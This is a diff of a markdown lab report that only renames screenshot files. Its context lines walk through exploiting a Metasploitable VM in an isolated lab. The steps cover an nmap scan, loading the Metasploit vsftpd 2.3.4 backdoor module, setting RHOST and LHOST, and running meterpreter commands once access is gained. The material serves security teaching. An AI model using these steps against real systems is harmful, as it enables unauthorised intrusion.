@@ -10,7 +10,7 @@ To perform a safe exploitation on a virtual machine using **Metasploit** to unde
 
 Open the **Kali Linux** virtual machine as the attacker machine and the **Metasploitable** virtual machine as the target machine. Configure both virtual machines to use a **Host-only Adapter** so that they can communicate within the isolated lab network.
 
-![Step 1 Screenshot](images/step_1.jpg)
+![Step 1 Screenshot](images/step_1.jpeg)
 
 ### Step 2: Verify IP addresses and network connectivity
 
@@ -20,7 +20,7 @@ Use `ifconfig` on both Kali Linux and Metasploitable to identify their IP addres
 ifconfig
 ping <Metasploitable-IP>
 ```
-![Step 2 Screenshot](images/step_2.jpg)
+![Step 2 Screenshot](images/step_2.jpeg)
 
 ### Step 3: Scan the target using Nmap
 
@@ -29,7 +29,7 @@ Perform a TCP SYN scan with service and OS detection from Kali Linux against the
 ```bash
 nmap -sS -sV -O <Metasploitable-IP>
 ```
-![Step 3 Screenshot](images/step_3.jpg)
+![Step 3 Screenshot](images/step_3.jpeg)
 
 ### Step 4: Search for the vulnerable FTP service in Metasploit
 
@@ -40,7 +40,7 @@ msfconsole
 > search vsftpd
 > use exploit/unix/ftp/vsftpd_234_backdoor
 ```
-![Step 4 Screenshot](images/step_4.jpg)
+![Step 4 Screenshot](images/step_4.jpeg)
 
 ### Step 5: Configure the exploit module
 Configure the exploit with the IP address of the Metasploitable target as **RHOST** and the IP address of Kali Linux as **LHOST**.
@@ -48,7 +48,7 @@ Configure the exploit with the IP address of the Metasploitable target as **RHOS
 ```bash
 # Commands:
 ```
-![Step 5 Screenshot](images/step_5.jpg)
+![Step 5 Screenshot](images/step_5.jpeg)
 
 ### Step 6: Execute the exploit and verify access
 
@@ -61,6 +61,6 @@ meterpreter> getuid
 meterpreter> sysinfo
 meterpreter> mkdir <your-name>
 ```
-![Step 6 Screenshot](images/step_6.jpg)
+![Step 6 Screenshot](images/step_6.jpeg)
 ## Result
 The experiment successfully demonstrated ethical exploitation of the Metasploitable system using **Metasploit** and verified access through basic Linux commands.
